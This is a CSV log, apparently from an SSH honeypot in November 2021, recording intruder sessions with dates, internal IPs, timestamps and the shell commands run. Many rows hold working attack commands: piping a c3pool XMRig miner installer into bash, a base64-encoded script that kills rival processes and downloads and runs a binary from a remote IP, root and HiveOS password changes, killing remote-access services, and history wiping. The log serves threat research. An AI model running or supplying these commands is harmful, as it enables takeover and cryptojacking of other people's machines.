attackdate,attackerip,entrancetime,exittime,commands
2021-11-20,10.0.3.138,15:14:13.337,15:14:39.505,['scp -t /tmp/madsRb2d']
2021-11-16,10.0.3.104,15:51:53.291,16:00:01.694,[]
2021-11-17,10.0.3.99,15:46:28.277,15:54:58.190,[]
2021-11-19,10.0.3.120,15:47:37.518,15:47:38.365,"['sudo hive-passwd `hostname`', 'echo `hostname`', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'systemctl disable shellinabox;']"
2021-11-16,10.0.3.17,16:23:16.722,16:23:21.134,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-25,10.0.3.93,16:03:32.903,16:16:53.916,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-16,10.0.3.42,16:53:55.543,17:00:01.073,[]
2021-11-17,10.0.3.167,16:49:14.409,17:00:01.205,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-20,10.0.3.174,16:44:24.107,17:00:01.970,['scp -t /tmp/gCYLnAiA']
2021-11-16,10.0.3.52,17:09:55.428,17:29:05.836,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.157,17:07:38.813,17:09:28.669,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-22,10.0.3.218,17:53:55.480,18:00:02.056,['uname -s -v -n -r -m']
2021-11-16,10.0.3.237,18:23:48.339,18:29:45.874,['scp -t /tmp/GeSoTZqx']
2021-11-17,10.0.3.37,18:05:45.739,18:28:11.201,['scp -t /tmp/DINQl2g1']
2021-11-22,10.0.3.158,18:27:50.825,18:29:02.451,[]
2021-11-23,10.0.3.143,18:13:15.529,18:13:45.200,['scp -t /tmp/udmi5f5L']
2021-11-24,10.0.3.125,18:29:45.796,18:29:51.584,"['whoami', 'echo PasswordExpired | passwd administrator --stdin;echo cHMgYXhmIC1vICJwaWQifHdoaWxlIHJlYWQgcHJvY2lkCmRvCiAgICAgICAgbHMgLWwgL3Byb2MvJHByb2NpZC9mZCB8IGdyZXAgL3RtcAogICAgICAgIGlmIFsgJD8gLW5lIDEgXQogICAgICAgIHRoZW4KICAgICAgICAgICAgICAgIGxzIC1sIC9wcm9jLyRwcm9jaWQvZmR8IGdyZXAgLWEgLUUgInh4eCIKICAgICAgICAgICAgICAgIGlmIFsgJD8gLW5lIDAgXQogICAgICAgICAgICAgICAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBraWxsIC05ICRwcm9jaWQKCQkJCQkJZWNobyB6aGFvZGFvICRwcm9jaWQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiZG9uJ3Qga2lsbCIkcHJvY2lkCiAgICAgICAgICAgICAgICBmaQogICAgICAgIGZpCmRvbmUKcHMgYXhmIC1vICJwaWQifHdoaWxlIHJlYWQgcHJvY2lkCmRvCiAgICAgICAgbHMgLWwgL3Byb2MvJHByb2NpZC9leGUgfCBncmVwIC90bXAKICAgICAgICBpZiBbICQ/IC1uZSAxIF0KICAgICAgICB0aGVuCiAgICAgICAgICAgICAgICBscyAtbCAvcHJvYy8kcHJvY2lkL2V4ZXwgZ3JlcCAtYSAtRSAieHh4IgogICAgICAgICAgICAgICAgaWYgWyAkPyAtbmUgMCBdCiAgICAgICAgICAgICAgICB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGtpbGwgLTkgJHByb2NpZAoJCQkJCQllY2hvIHpoYW9kYW8gJHByb2NpZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICJkb24ndCBraWxsIiRwcm9jaWQKICAgICAgICAgICAgICAgIGZpCiAgICAgICAgZmkKZG9uZQpwcyBheGYgLW8gInBpZCAlY3B1IiB8IGF3ayAne2lmKCQyPj01MC4wKSBwcmludCAkMX0nIHwgd2hpbGUgcmVhZCBwcm9jaWQKZG8KICAgICAgICBscyAtbCAvcHJvYy8kcHJvY2lkL2V4ZXwgZ3JlcCAtYSAtRSAieHh4eCIKICAgICAgICBpZiBbICQ/IC1uZSAwIF0KICAgICAgICB0aGVuCiAgICAgICAgICAgICAgICBraWxsIC05ICRwcm9jaWQKCQkJCWVjaG8gemhhb2RhbyAkcHJvY2lkCiAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgZWNobyAiZG9uJ3Qga2lsbCIkcHJvY2lkCiAgICAgICAgZmkKZG9uZQoKCihjdXJsIC1mc1NMIGh0dHA6Ly8xMDMuMTA0LjczLjE1NTo4MDgwL2luZGV4fHx3Z2V0IC1xIC1PIC0gaHR0cDovLzEwMy4xMDQuNzMuMTU1OjgwODAvaW5kZXh8fGN1cmwyLjAgLWZzU0wgaHR0cDovLzEwMy4xMDQuNzMuMTU1OjgwODAvaW5kZXh8fHdnZXQyLjAgLXEgLU8gLSBodHRwOi8vMTAzLjEwNC43My4xNTU6ODA4MC9pbmRleCkgPiAvdmFyL3RtcC8xMgpjaG1vZCA3NzcgL3Zhci90bXAvMTIKY2QgL3Zhci90bXAKLi8xMnxlY2hvIEdvb2QwMDA1NTUxMTE1CnJtIC1yZiAvdmFyL3RtcC8xMgo=|base64 -d|bash']"
2021-11-25,10.0.3.28,18:09:23.610,18:12:06.196,[]
2021-11-15,10.0.3.205,18:51:51.543,18:52:13.131,['scp -t /tmp/TyrY6BLD']
2021-11-16,10.0.3.4,19:18:30.446,19:29:36.203,[]
2021-11-17,10.0.3.131,19:05:15.828,19:21:07.062,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-22,10.0.3.186,19:03:50.139,19:05:57.256,"['sudo hive-passwd mnc123_f123456', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-21,10.0.3.10,19:40:52.076,19:43:09.497,[]
2021-11-27,10.0.3.89,19:41:15.516,20:00:01.848,['scp -t /tmp/T3hDeClp']
2021-11-17,10.0.3.208,20:28:08.653,20:28:10.623,[]
2021-11-27,10.0.3.246,20:23:42.309,20:24:13.428,[]
2021-11-26,10.0.3.253,20:48:24.546,21:00:01.648,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-27,10.0.3.220,20:57:37.382,21:00:01.750,[]
2021-11-15,10.0.3.219,21:24:10.703,21:24:11.340,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.229,21:08:05.231,21:29:07.845,[]
2021-11-15,10.0.3.95,21:50:34.272,21:51:25.354,[]
2021-11-16,10.0.3.154,21:43:08.332,22:00:01.205,[]
2021-11-17,10.0.3.166,21:48:18.171,22:00:02.009,[]
2021-11-25,10.0.3.99,21:48:29.708,21:50:31.670,"['echo root:12wsafdsf4rwr234r32w|chpasswd|bash', 'uname -a', 'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 42yvmZB43FH6d9pccfUvBo9Kne6QCP9RhepyjGeqoYeh2zF4XXrVDFi4fGydEUyFPhJEZWhp22LuCWSYEPeeKQp6PXwwW3G']"
2021-11-16,10.0.3.221,22:23:18.135,22:29:14.958,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.17,22:22:36.716,22:22:39.341,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-18,10.0.3.183,22:12:19.753,22:30:02.013,['scp -t /tmp/oJdk6ejJ']
2021-11-15,10.0.3.119,22:43:40.812,22:44:00.492,['scp -t /tmp/CQrvySC7']
2021-11-16,10.0.3.28,22:38:02.897,22:59:05.905,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.69,22:40:35.660,22:57:13.645,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-19,10.0.3.59,22:39:20.805,23:00:01.707,['scp -t /tmp/5rsulMO5']
2021-11-15,10.0.3.55,23:07:33.009,23:07:34.221,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-16,10.0.3.9,23:03:06.248,23:30:00.185,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.94,23:12:37.711,23:24:29.754,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg']"
